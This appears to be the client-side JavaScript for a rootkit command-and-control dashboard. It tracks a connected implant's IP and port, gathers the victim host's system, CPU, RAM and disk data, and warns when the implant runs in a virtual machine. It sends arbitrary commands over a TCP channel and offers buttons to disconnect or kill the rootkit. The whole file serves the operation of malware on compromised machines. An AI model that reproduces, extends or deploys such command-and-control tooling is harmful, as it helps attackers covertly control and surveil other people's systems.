// === Cache and DOM Elements ===
const dom = {
    diskUsageOutput: document.getElementById('diskusage-output'),
    sysInfoList: document.getElementById('sysinfo-list'),
    statusCard: document.getElementById('main-card'),
    connectModal: document.getElementById('connect-modal'),
    connectInput: document.getElementById('connect-input'),
    connectButton: document.getElementById('connect_button'),
    errorMessage: document.querySelector('.error-message'),
    cpuRamCanvas: document.getElementById('sysGraph'),
};

let systemInfos = null; // Cache for system information
let diskUsage = null; // Cache for disk usage
const intervals = {}; // Object to store intervals for periodic tasks


// === CPU / RAM Chart ===
// Initialize chart for CPU and RAM usage
const ctx = dom.cpuRamCanvas.getContext('2d');
const chartData = {
    labels: [], // Time labels
    datasets: [
        { label: 'CPU (%)', borderColor: '#aa0000', data: [], fill: false }, // CPU data
        { label: 'RAM (%)', borderColor: '#007acc', data: [], fill: false }, // RAM data
    ],
};

const chart = new Chart(ctx, {
    type: 'line',
    data: chartData,
    options: {
        animation: false,
        scales: {
            y: { min: 0, max: 100 }, // Y-axis range
        },
    },
});

// === Utility Functions ===

// Check if the cache is valid (not empty)
function isCacheValid(cache) {
    return cache && Object.keys(cache).length > 0;
}

// Fetch JSON data from a given URL with optional configurations
async function fetchJSON(url, options = {}) {
    try {
        const response = await fetch(url, options);
        const data = await response.json().catch(() => null);
        if (!response.ok) {
            console.error(`Fetch error ${response.status} from ${url}`, data);
            return { data: null, status: response.status };
        }
        return { data, status: response.status };
    } catch (e) {
        console.error(`Network error fetching ${url}`, e);
        return { data: null, status: 500 };
    }
}

async function sendDisconnectCommand() {
    const logout_button = document.getElementById('logout_button');
    logout_button.disabled = true;
    const oldText = logout_button.textContent;
    logout_button.textContent = 'Disconnecting...';
    
    const data = await sendCommand(URL_DISCONNECT);
    
    logout_button.disabled = false;
    logout_button.textContent = oldText;

    return data;
}

async function sendKillCommand() {
    const killcom_button = document.getElementById('killcom_button');
    killcom_button.disabled = true;
    const oldText = killcom_button.textContent;
    killcom_button.textContent = 'Killing...';
    
    const data = await sendCommand(URL_KILLCOM);
    
    killcom_button.disabled = false;
    killcom_button.textContent = oldText;

    return data;
}

// Send a command to the server
async function sendCommand(url, command, channel = 'tcp') {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command, channel, use_history: false }),
        });

        let data = null;
        try {
            data = await response.json();
        } catch {
            console.warn('Non-JSON response from server.');
        }

        return { data, status: response.status };
    } catch (error) {
        console.error('Error sending command:', error);
        return { data: { error: 'Network or server error' }, status: 500 };
    }
}

// === Dashboard ===

// Update the dashboard with the latest information
async function updateDashboard(firstLoad = false) {
    try {
        const params = clientInfoCache;
        const is_authenticated = params.authenticated || false;
        const rootkitAddress = params.rootkit_address || [];
        const lastCommand = params.last_command || 'None';

        dom.statusCard.innerHTML = '';
        document.querySelectorAll('.if_auth').forEach(el => (el.style.display = 'none'));

        let html = '';

        if (!rootkitAddress.length) {
            html = `
                <p><strong>Status:</strong> 🔴 Disconnected</p>
                <p>🟥 No rootkit connected.</p>
            `;
            dom.statusCard.classList.add('not_connected');
            deactivateCpuRamFetching();
        } else {
            await fetchAndUpdateSysInfo();
            const client_is_vm = systemInfos?.virtual_env;

            if (!is_authenticated) {
                html = `
                    <p><strong>Status:</strong> 🟡 Connected (Not authenticated)</p>
                    <table class="info-table">
                        <tr><th>📍 IP</th><td>${rootkitAddress[0]}</td></tr>
                        <tr><th>🔌 Port</th><td>${rootkitAddress[1]}</td></tr>
                        <tr><th>🕒 Time</th><td class='time'>${new Date().toLocaleTimeString()}</td></tr>
                    </table>
                    ${client_is_vm ? `<p style="color: red;">⚠️ Warning: rootkit client is running in a VM.</p>` : ''}
                    <button onclick="modal.open()">🔐 Authenticate</button>
                `;
                dom.statusCard.classList.add('not_auth_status_card');
            } else {
                fetchSysDiskUsage();
                runCpuRamFetching();

                html = `
                    <h4>👾 Rootkit Dashboard</h4>
                    <p><strong>Status:</strong> ✅ Connected</p>
                    <table class="info-table">
                        <tr><th>📍 IP</th><td>${rootkitAddress[0]}</td></tr>
                        <tr><th>🔌 Port</th><td>${rootkitAddress[1]}</td></tr>
                        <tr><th>🕒 Time</th><td>${new Date().toLocaleTimeString()}</td></tr>
                        <tr><th>📜 Last Command</th><td>${lastCommand}</td></tr>
                    </table>
                    ${client_is_vm ? `<p style="color: red;">⚠️ Warning: rootkit client is running in a VM.</p>` : ''}
                    <span class='button-span'>
                        <button id='logout_button' onclick="sendDisconnectCommand().then(() => location.reload())">👋 Disconnect</button>
                        <button id='killcom_button' class="danger-btn" onclick="sendKillCommand().then(() => location.reload())">💀 Kill rootkit</button>
                    </span>
                `;
                document.querySelectorAll('.if_auth').forEach(el => (el.style.display = 'flex'));
                dom.statusCard.classList.remove('not_auth_status_card');
            }

            // Automatically update time every second
            setInterval(() => {
                const timeCell = dom.statusCard.querySelector('.info-table .time');
                if (timeCell) {
                    timeCell.textContent = new Date().toLocaleTimeString();
                }
            }, 1000);
        }

        dom.statusCard.innerHTML = html;

        if (firstLoad) dom.statusCard.classList.remove('hidden-until-loaded');
    } catch (error) {
        console.error('Error updating dashboard:', error);
        dom.statusCard.innerHTML = `
            <p><strong>Status:</strong> 🔴 Disconnected</p>
            <p>🟥 No rootkit connected.</p>
        `;
        dom.statusCard.classList.remove('hidden-until-loaded');
        deactivateCpuRamFetching();
    }
}

// === Initialization ===

// Initial dashboard update and periodic updates
updateDashboard(true);
setInterval(() => updateDashboard(), 5000);
